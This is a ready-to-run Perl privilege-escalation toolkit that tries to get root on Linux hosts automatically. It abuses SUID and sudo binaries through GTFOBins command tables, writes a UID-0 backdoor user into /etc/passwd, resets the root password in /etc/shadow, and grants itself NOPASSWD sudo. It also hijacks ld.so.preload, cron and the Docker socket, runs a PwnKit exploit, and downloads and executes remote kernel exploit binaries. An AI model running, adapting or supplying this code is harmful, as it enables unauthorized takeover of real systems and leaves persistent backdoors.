#!/usr/bin/perl
# autoroot.pl - Localroot Auto-Exploit Toolkit (Perl Edition)
# CoupDeGrace x BOB MARLEY LABS
# Auto root via misconfig + kernel exploits

use strict;
use warnings;
use POSIX qw(setuid setgid getuid geteuid);
use File::stat;
use MIME::Base64;

my $VERSION = "1.0-perl";

# ===== CONFIG =====
my $REPO_RAW = "https://github.com/coupdegrace223/LPE-Toolkit/raw/main";
my $USE_COLOR = 1;

# ===== COLORS =====
my ($R,$G,$Y,$C,$W,$Z) = ("","","","","","");
if ($USE_COLOR) {
    $R = "\033[1;31m"; $G = "\033[1;32m"; $Y = "\033[1;33m";
    $C = "\033[1;36m"; $W = "\033[1;37m"; $Z = "\033[0m";
}

# ===== GTFOBINS SUID =====
my %GTFOBINS = (
    "ash"     => "ash -c 'chmod +s /bin/bash'",
    "awk"     => q{awk 'BEGIN {system("chmod +s /bin/bash")}'},
    "bash"    => "bash -p",
    "busybox" => "busybox sh -c 'chmod +s /bin/bash'",
    "cp"      => "cp /bin/bash /tmp/.sb; chmod +s /tmp/.sb",
    "csh"     => "csh -c 'chmod +s /bin/bash'",
    "dash"    => "dash -c 'chmod +s /bin/bash'",
    "dd"      => "dd if=/bin/bash of=/tmp/.sb; chmod +s /tmp/.sb",
    "env"     => "env /bin/sh -c 'chmod +s /bin/bash'",
    "find"    => "find . -exec /bin/sh -c 'chmod +s /bin/bash' \\;",
    "flock"   => "flock -u / /bin/sh -c 'chmod +s /bin/bash'",
    "gawk"    => q{/usr/bin/gawk 'BEGIN {system("chmod +s /bin/bash")}'},
    "grep"    => "grep '' /bin/bash >/tmp/.sb; chmod +s /tmp/.sb",
    "ksh"     => "ksh -c 'chmod +s /bin/bash'",
    "lua"     => "lua -e 'os.execute(\"chmod +s /bin/bash\")'",
    "mawk"    => q{/usr/bin/mawk 'BEGIN {system("chmod +s /bin/bash")}'},
    "nice"    => "nice /bin/sh -c 'chmod +s /bin/bash'",
    "nohup"   => "nohup /bin/sh -c 'chmod +s /bin/bash'",
    "perl"    => q{perl -e 'exec "/bin/sh", "-c", "chmod +s /bin/bash"'},
    "php"     => "php -r 'system(\"chmod +s /bin/bash\");'",
    "python"  => "python -c 'import os;os.system(\"chmod +s /bin/bash\")'",
    "python3" => "python3 -c 'import os;os.system(\"chmod +s /bin/bash\")'",
    "rsync"   => "rsync /bin/bash /tmp/.sb; chmod +s /tmp/.sb",
    "ruby"    => "ruby -e 'exec \"/bin/sh\", \"-c\", \"chmod +s /bin/bash\"'",
    "sh"      => "/bin/sh -c 'chmod +s /bin/bash'",
    "socat"   => "socat - EXEC:'chmod +s /bin/bash'",
    "tar"     => "tar -cf - /bin/bash | tar -xf - -C /tmp; chmod +s /tmp/bin/bash",
    "taskset" => "taskset 1 /bin/sh -c 'chmod +s /bin/bash'",
    "tee"     => "tee /tmp/.sb < /bin/bash >/dev/null; chmod +s /tmp/.sb",
    "timeout" => "timeout 1 /bin/sh -c 'chmod +s /bin/bash'",
    "vim"     => "vim -c ':!chmod +s /bin/bash' -c ':q!' /dev/null 2>/dev/null",
    "xargs"   => "echo /bin/sh | xargs -I{} {} -c 'chmod +s /bin/bash'",
    "zsh"     => "zsh -c 'chmod +s /bin/bash'",
);

# ===== TOOLS =====
sub sys_cmd {
    my ($cmd, $timeout) = @_;
    $timeout ||= 10;
    my $out = '';
    eval {
        local $SIG{ALRM} = sub { die "timeout\n" };
        alarm $timeout;
        $out = `$cmd 2>/dev/null`;
        alarm 0;
    };
    chomp $out;
    return $out;
}

sub isroot { return (getuid() == 0 && geteuid() == 0); }

sub droproot {
    if (isroot()) {
        print "${G}[+] GOT ROOT!${Z}\n";
        print "${G}[+] Spawning shell...${Z}\n";
        $ENV{HISTFILE} = "/dev/null";
        exec "/bin/sh", "-p" or exec "/bin/bash", "-p";
        exit 0;
    }
}

sub file_exists { -e $_[0] }
sub file_writable { -w $_[0] }

sub find_binary {
    my $name = shift;
    for my $d (split /:/, $ENV{PATH} || "/bin:/usr/bin") {
        my $p = "$d/$name";
        return $p if -x $p;
    }
    return undef;
}

sub is_suid {
    my $f = shift;
    return (-e $f && (stat($f)->mode & 04000));
}

sub try_suid_bash {
    if (is_suid("/bin/bash")) {
        print "${G}[+] /bin/bash is SUID! Taking root shell...${Z}\n";
        exec "/bin/bash", "-p";
        # unreachable - exec replaces process
    }
    if (is_suid("/tmp/.sb")) {
        print "${G}[+] /tmp/.sb is SUID! Taking root shell...${Z}\n";
        exec "/tmp/.sb", "-p";
    }
    return 0;
}

# ===== EXPLOIT: SUID Binary Abuse =====
sub exploit_suid {
    print "${C}[*] Scanning SUID binaries...${Z}\n";
    my @suids;
    for my $sp (qw(/bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /tmp /var/tmp)) {
        next unless -d $sp;
        my $fh;
        if (open($fh, '-|', "find $sp -maxdepth 3 -type f -perm -4000 -user root 2>/dev/null")) {
            while (<$fh>) { chomp; push @suids, $_; }
            close $fh;
        }
    }

    my %seen;
    @suids = grep { !$seen{$_}++ } @suids;
    print "${C}[*] Found ".scalar(@suids)." SUID root binaries${Z}\n";

    for my $path (@suids) {
        my $bin = (split /\//, $path)[-1];
        next unless exists $GTFOBINS{$bin};
        print "${G}[+] Exploitable: $bin ($path)${Z}\n";
        my $cmd = $GTFOBINS{$bin};
        print "${C}[*] Running: $cmd${Z}\n";
        sys_cmd($cmd);
        try_suid_bash();
        return 1 if isroot();
    }
    return 0;
}

# ===== EXPLOIT: Writable /etc/passwd =====
sub exploit_passwd {
    return 0 unless file_writable("/etc/passwd");
    print "${G}[+] /etc/passwd is writable!${Z}\n";

    my $hash = crypt("ganteng123", "\$6\$" . join('', map { chr(97+rand(26)) } 1..8));
    my $user = "coup";
    my $entry = "$user:$hash:0:0:root:/root:/bin/bash\n";

    open(my $pf, '>>', '/etc/passwd') or return 0;
    print $pf $entry;
    close $pf;
    print "${G}[+] Added $user (UID 0, pass: ganteng123)${Z}\n";

    # Try su via python3 pty
    if (find_binary("python3")) {
        system(qq{python3 -c '
import pty, os
pid = os.fork()
if pid == 0:
    try:
        pty.spawn(["/bin/su", "$user", "-c", "chmod +s /bin/bash; cp /bin/bash /tmp/.sb; chmod +s /tmp/.sb"])
    except:
        pass
    os._exit(0)
else:
    os.waitpid(pid, 0)
' 2>/dev/null});
    }

    # Try ssh localhost
    if (find_binary("ssh")) {
        system(qq{ssh -o StrictHostKeyChecking=no -o PasswordAuthentication=yes $user\@localhost 'chmod +s /bin/bash' 2>/dev/null});
    }

    # Try compiling a suid helper via PAM modules
    try_suid_bash();
    return 1;
}

# ===== EXPLOIT: Writable /etc/shadow =====
sub exploit_shadow {
    return 0 unless -w "/etc/shadow" && -r "/etc/shadow";
    print "${G}[+] /etc/shadow is writable!${Z}\n";
    my $salt = join '', ('a'..'z','0'..'9')[map {rand 36} 1..8];
    my $hash = crypt("rooted", "\$6\$$salt");
    open(my $fh, '<', '/etc/shadow') or return 0;
    my $content = do { local $/; <$fh> };
    close $fh;
    $content =~ s/^root:[^:]+/root:$hash/m;
    open($fh, '>', '/etc/shadow') or return 0;
    print $fh $content;
    close $fh;
    print "${G}[+] Root password set to: rooted${Z}\n";
    sys_cmd("echo 'rooted' | su - -c 'chmod +s /bin/bash' 2>/dev/null");
    try_suid_bash();
    droproot();
    return 1;
}

# ===== EXPLOIT: Writable /etc/sudoers =====
sub exploit_sudoers {
    return 0 unless file_writable("/etc/sudoers");
    print "${G}[+] /etc/sudoers is writable!${Z}\n";
    my $user = getpwuid($<) || "nobody";
    open(my $fh, '>>', '/etc/sudoers') or return 0;
    print $fh "$user ALL=(ALL) NOPASSWD: ALL\n";
    close $fh;
    print "${G}[+] Added NOPASSWD sudo for $user${Z}\n";
    sys_cmd("sudo -n /bin/sh -c 'exec /bin/sh -p'");
    droproot();
    return 1;
}

# ===== EXPLOIT: Writable ld.so.preload =====
sub exploit_ldpreload {
    return 0 unless (-e "/etc/ld.so.preload" && -w "/etc/ld.so.preload");
    print "${G}[+] /etc/ld.so.preload is writable!${Z}\n";
    my $tmp = "/tmp/.ld_$$";
    mkdir $tmp;
    open(my $f, '>', "$tmp/root.c") or return 0;
    print $f q{
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__((constructor)) void rootme() {
    chmod("/bin/bash", 04755);
}
    };
    close $f;
    sys_cmd("gcc -shared -fPIC -o $tmp/root.so $tmp/root.c 2>/dev/null");
    if (-e "$tmp/root.so") {
        if (open(my $lf, '>', '/etc/ld.so.preload')) {
            print $lf "$tmp/root.so\n";
            close $lf;
            print "${C}[*] Injected. Triggering...${Z}\n";
            sys_cmd("sudo -n /bin/true 2>/dev/null");
            sys_cmd("pkexec /bin/true 2>/dev/null");
        }
    }
    try_suid_bash();
    droproot();
    return 1;
}

# ===== EXPLOIT: PwnKit (CVE-2021-4034) =====
sub exploit_pwnkit {
    my $pkexec = find_binary("pkexec");
    return 0 unless ($pkexec && is_suid($pkexec));
    print "${G}[+] pkexec SUID - PwnKit candidate!${Z}\n";

    my $tmp = "/tmp/.pk_$$";
    mkdir $tmp;

    my $gconv_dir = "$tmp/GCONV_PATH=.";
    mkdir $gconv_dir;
    mkdir "$gconv_dir/pwnkit";

    open(my $fh1, '>', "$gconv_dir/pwnkit") or return 0;
    print $fh1 "#!/bin/sh\nchmod +s /bin/bash\n";
    close $fh1;
    chmod 0755, "$gconv_dir/pwnkit";

    mkdir "$tmp/pwnkit";
    open(my $fh2, '>', "$tmp/pwnkit/gconv-modules") or return 0;
    print $fh2 "module UTF-8// PWNKIT// pwnkit 2\n";
    close $fh2;

    open(my $fh3, '>', "$tmp/pwnkit/pwnkit.c") or return 0;
    print $fh3 q{
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv(void) {}
void gconv_init(void *step) {
    setuid(0); setgid(0);
    setegid(0); seteuid(0);
    system("chmod +s /bin/bash");
    _exit(0);
}
    };
    close $fh3;

    sys_cmd("gcc -shared -fPIC -o $tmp/pwnkit/pwnkit.so $tmp/pwnkit/pwnkit.c 2>/dev/null");

    if (-e "$tmp/pwnkit/pwnkit.so") {
        $ENV{GCONV_PATH} = $gconv_dir;
        $ENV{CHARSET} = "PWNKIT";
        $ENV{SHELL} = "pwnkit";
        $ENV{PATH} = "$tmp:$ENV{PATH}";
        sys_cmd("/usr/bin/pkexec 2>/dev/null");
    }

    try_suid_bash();
    droproot();
    return 1;
}

# ===== EXPLOIT: Cron Hijack =====
sub exploit_cron {
    my @cron_dirs = qw(/etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly);
    for my $cd (@cron_dirs) {
        next unless (-d $cd && -w $cd);
        print "${G}[+] $cd is writable!${Z}\n";
        open(my $f, '>', "$cd/0rootme");
        print $f "#!/bin/sh\nchmod +s /bin/bash\n";
        close $f;
        chmod 0755, "$cd/0rootme";
        print "${C}[*] Waiting for cron (max 60s)...${Z}\n";
        for (1..30) {
            sleep 2;
            try_suid_bash();
            return 1 if isroot();
        }
        unlink "$cd/0rootme";
    }
    return 0;
}

# ===== EXPLOIT: Docker Socket =====
sub exploit_docker {
    return 0 unless -w "/var/run/docker.sock";
    print "${G}[+] Docker socket writable!${Z}\n";
    if (find_binary("docker")) {
        sys_cmd("docker run --rm -v /:/host alpine chroot /host /bin/sh -c 'chmod +s /bin/bash' 2>/dev/null", 30);
    }
    try_suid_bash();
    droproot();
    return 1;
}

# ===== SUDO GTFOBINS =====
my %SUDO_ABUSE = (
    "ash"     => "ash",
    "awk"     => q{awk 'BEGIN {system("/bin/sh -p")}'},
    "bash"    => "bash -p",
    "busybox" => "busybox sh -p",
    "cp"      => "cp /bin/sh /tmp/.sh; chmod +s /tmp/.sh; /tmp/.sh -p",
    "csh"     => "csh -c 'exec /bin/sh -p'",
    "dash"    => "dash -c 'exec /bin/sh -p'",
    "find"    => "find . -exec /bin/sh -p \\; -quit",
    "gdb"     => "gdb -nx -ex '!sh -p' -ex quit",
    "git"     => "git -p help config 2>/dev/null; !/bin/sh -p",
    "less"    => "less /etc/passwd; !/bin/sh -p",
    "lua"     => "lua -e 'os.execute(\"/bin/sh -p\")'",
    "man"     => "man -P 'sh -p' man 2>/dev/null",
    "more"    => "more /etc/passwd; !/bin/sh -p",
    "nano"    => "nano -s /bin/sh -c 'exec /bin/sh -p'",
    "nice"    => "nice /bin/sh -p",
    "nohup"   => "nohup /bin/sh -p",
    "perl"    => "perl -e 'exec \"/bin/sh\", \"-p\"'",
    "php"     => q{php -r 'system("chmod +s /bin/bash");system("/bin/sh -p");'},
    "python"  => "python -c 'import pty; pty.spawn(\"/bin/sh -p\")'",
    "python3" => "python3 -c 'import pty; pty.spawn(\"/bin/sh -p\")'",
    "ruby"    => "ruby -e 'exec \"/bin/sh\", \"-p\"'",
    "rsync"   => "rsync -e 'sh -p -c \"sh -p 0<&2 1>&2\"' 127.0.0.1:/dev/null",
    "script"  => "script -qc /bin/sh /dev/null",
    "socat"   => "socat - EXEC:'sh -p',pty,stderr,setsid,sigint,sane",
    "ssh"     => "ssh -o ProxyCommand=';sh -p 0<&2 1>&2' x",
    "systemctl" => "systemctl status -- '-p;sh -p 0<&2 1>&2 #'",
    "tar"     => "tar -cf - /dev/null | tar -xf - --to-command='/bin/sh -p'",
    "taskset" => "taskset 1 /bin/sh -p",
    "tcpdump" => "tcpdump -i lo -G 1 -z '/bin/sh -p' -w /dev/null 2>/dev/null",
    "tee"     => "tee /dev/null <<< '' 2>/dev/null",
    "timeout" => "timeout 1 /bin/sh -p",
    "vim"     => "vim -c ':!sh -p' -c ':q!' /dev/null 2>/dev/null",
    "watch"   => "watch -x sh -c 'sh -p' 2>/dev/null",
    "zsh"     => "zsh -c 'exec zsh'",
);

# ===== EXPLOIT: Sudo -l =====
sub exploit_sudo {
    my $sudo_list = sys_cmd("timeout 2 sudo -l 2>/dev/null");
    return 0 unless $sudo_list;

    print "${G}[+] Sudo access detected!${Z}\n";
    print "$sudo_list\n";

    if ($sudo_list =~ /NOPASSWD:\s*ALL/ || $sudo_list =~ /\(ALL\).*NOPASSWD.*ALL/) {
        print "${G}[+] Full NOPASSWD sudo!${Z}\n";
        sys_cmd("sudo -n /bin/sh -c 'exec /bin/sh -p'");
        droproot();
        return 1;
    }

    if ($sudo_list =~ /env_keep.*LD_PRELOAD/i) {
        print "${G}[+] LD_PRELOAD in env_keep!${Z}\n";
        my $tmp = "/tmp/.ld_$$";
        mkdir $tmp;
        open(my $f, '>', "$tmp/x.c");
        print $f '#include <unistd.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("chmod +s /bin/bash"); }';
        close $f;
        sys_cmd("gcc -shared -fPIC -nostartfiles -o $tmp/x.so $tmp/x.c 2>/dev/null");
        sys_cmd("sudo -n LD_PRELOAD=$tmp/x.so /bin/true 2>/dev/null");
        try_suid_bash();
        droproot();
        return 1;
    }

    # Parse ALLOWED commands and match against SUDO_ABUSE
    while ($sudo_list =~ /\(ALL\)\s+NOPASSWD:\s*(\S[\s\S]*?)(?=\n\s*\(|\n\n|\Z)/g) {
        my $cmds = $1;
        my @binaries = split /\s*,\s*/, $cmds;
        for my $bin_path (@binaries) {
            $bin_path =~ s/^\s+//;
            my $bin_name = (split /\//, $bin_path)[-1];
            $bin_name =~ s/\s.*//;
            if (exists $SUDO_ABUSE{$bin_name}) {
                print "${G}[+] Exploitable sudo: $bin_name ($bin_path)${Z}\n";
                # Strategy: use sudo to chmod +s /bin/bash, then exec it
                my $suid_cmd;
                if ($bin_name eq "php") {
                    $suid_cmd = "sudo -n php -r 'system(\"chmod +s /bin/bash\");'";
                } elsif ($bin_name =~ /^python3?$/) {
                    $suid_cmd = qq{sudo -n $bin_name -c 'import os;os.system("chmod +s /bin/bash")'};
                } elsif ($bin_name eq "perl") {
                    $suid_cmd = q{sudo -n perl -e 'system("chmod +s /bin/bash")'};
                } elsif ($bin_name =~ /^(bash|sh|dash|ash|busybox|zsh|ksh|csh)$/) {
                    $suid_cmd = "sudo -n $bin_path -c 'chmod +s /bin/bash'";
                } else {
                    $suid_cmd = qq{sudo -n $bin_path -c 'chmod +s /bin/bash'};
                }
                print "${C}[*] $suid_cmd${Z}\n";
                system($suid_cmd);
                try_suid_bash();
                return 1;
            }
        }
    }
    return 0;
}

# ===== BINARY DOWNLOAD =====
sub download_binary {
    my ($name) = @_;
    my $url = "$REPO_RAW/$name";
    print "${C}[*] Downloading $name...${Z}\n";
    my $tmp = "/tmp/.x_$$";
    if (find_binary("wget")) {
        sys_cmd("wget -q --no-check-certificate '$url' -O $tmp", 30);
    } elsif (find_binary("curl")) {
        sys_cmd("curl -sk '$url' -o $tmp 2>/dev/null", 30);
    } else {
        print "${R}[-] No wget or curl${Z}\n";
        return 0;
    }
    if (-s $tmp > 10000) {
        chmod 0755, $tmp;
        print "${G}[+] Downloaded (".(-s $tmp)." bytes)${Z}\n";
        print "${C}[*] Executing...${Z}\n";
        sys_cmd("$tmp", 60);
        try_suid_bash();
        if (isroot() || is_suid("/bin/bash")) {
            return 1;
        }
    }
    unlink $tmp;
    return 0;
}

sub auto_exploit_binary {
    my ($kern) = @_;
    my ($maj,$min,$pat) = $kern =~ /^(\d+)\.(\d+)(?:\.(\d+))?/ or return 0;
    $pat ||= 0;

    # All exploits ordered by priority, with kernel range check
    my @all = (
        # 2026 CVEs - broad kernel coverage
        {bin=>"copyfail-go-static",         lo=>[5,0,0],  hi=>[7,1,99]},
        {bin=>"dirtyfrag-static",           lo=>[5,0,0],  hi=>[7,1,99]},
        {bin=>"fragnesia-static",           lo=>[5,0,0],  hi=>[7,1,99]},
        {bin=>"fragnesia2-static",          lo=>[5,0,0],  hi=>[7,1,99]},
        {bin=>"dirtydecrypt-static",        lo=>[5,0,0],  hi=>[7,1,99]},
        {bin=>"pintheft-static",            lo=>[5,0,0],  hi=>[7,1,99]},
        {bin=>"cifswitch-static",           lo=>[5,0,0],  hi=>[7,1,99]},
        {bin=>"pidfd-race-static",          lo=>[5,0,0],  hi=>[7,1,99]},
        {bin=>"packet-edit-meme-static",    lo=>[5,18,0], hi=>[7,1,99]},
        {bin=>"dirtyclone-static",          lo=>[7,0,0],  hi=>[7,1,99]},
        {bin=>"bad-epoll-static",           lo=>[6,12,0], hi=>[6,12,99]},
        {bin=>"fuse-oob-static",            lo=>[6,15,0], hi=>[99,0,0]},
        {bin=>"ipv6-frag-escape-static",    lo=>[6,12,0], hi=>[6,12,99]},
        # 2022-2024 CVEs
        {bin=>"dirtypipe-static",           lo=>[5,8,0],  hi=>[5,16,11]},
        {bin=>"nft-uaf-static",             lo=>[5,0,0],  hi=>[6,99,0]},
        {bin=>"nft-uaf2-static",            lo=>[5,0,0],  hi=>[5,18,0]},
        {bin=>"netfilter-oob-static",       lo=>[2,6,19], hi=>[5,12,0]},
        # 2021 CVEs
        {bin=>"overlayfs-static",           lo=>[3,0,0],  hi=>[5,11,0]},
        {bin=>"ovfs-fuse-static",           lo=>[5,11,0], hi=>[99,0,0]},
        # Services
        {bin=>"pwnkit-new-static",          lo=>[0,0,0],  hi=>[99,0,0]},
        {bin=>"pack2theroot-static",        lo=>[0,0,0],  hi=>[99,0,0]},
        {bin=>"polkit-dbus-static",         lo=>[0,0,0],  hi=>[99,0,0]},
        {bin=>"docker-sock-static",         lo=>[0,0,0],  hi=>[99,0,0]},
    );

    for my $e (@all) {
        my ($lo_m,$lo_i,$lo_p) = @{$e->{lo}};
        my ($hi_m,$hi_i,$hi_p) = @{$e->{hi}};
        my $vk = $maj*10000 + $min*100 + $pat;
        my $vlo = $lo_m*10000 + $lo_i*100 + $lo_p;
        my $vhi = $hi_m*10000 + $hi_i*100 + $hi_p;
        next unless ($vk >= $vlo && $vk <= $vhi);
        if (download_binary($e->{bin})) {
            return 1;  # got root!
        }
        # continue trying next exploit
    }
    return 0;
}

# ===== MAIN =====
sub main {
    print "$W\n";
    print "============================================================\n";
    print "  Localroot Auto-Exploit v$VERSION (CoupDeGrace Edition)\n";
    print "============================================================\n";
    print "${Z}\n";

    my $hostname = sys_cmd("hostname") || "unknown";
    my $kern = sys_cmd("uname -r");
    my $arch = sys_cmd("uname -m");
    my $user = getpwuid($<) || "unknown";
    my $uid = $<;
    my $gid = $(;

    print "${C}[*] System Info:${Z}\n";
    print "    Host:     $W$hostname${Z}\n";
    print "    Kernel:   $W$kern${Z}\n";
    print "    Arch:     $W$arch${Z}\n";
    print "    User:     $W$user${Z} (uid=$uid gid=$gid)\n";
    print "    Perl:     $W$]${Z}\n\n";

    my @phases = (
        ["Phase 1: Filesystem misconfig", sub { exploit_passwd(); exploit_shadow(); exploit_sudoers(); exploit_ldpreload(); }],
        ["Phase 2: SUID/GUID",           sub { exploit_suid(); }],
        ["Phase 3: Sudo checks",          sub { exploit_sudo(); }],
        ["Phase 4: PwnKit",              sub { exploit_pwnkit(); }],
        ["Phase 5: Docker",              sub { exploit_docker(); }],
        ["Phase 6: Cron hijack",         sub { exploit_cron(); }],
    );

    if (find_binary("wget") || find_binary("curl")) {
        push @phases, ["Phase 7: Kernel exploits", sub { auto_exploit_binary($kern); }];
    }

    for my $phase (@phases) {
        my ($name, $code) = @$phase;
        print "${C}[*] $name...${Z}\n";
        $code->();
        try_suid_bash();
        last if is_suid("/bin/bash") || isroot();
    }

    try_suid_bash();
    if (isroot()) { droproot(); }

    print "${R}[-] No exploit succeeded.${Z}\n";
    if (is_suid("/bin/bash")) {
        print "${G}[+] /bin/bash is SUID! Run: /bin/bash -p${Z}\n";
        exec "/bin/bash", "-p";
    }
}

main();
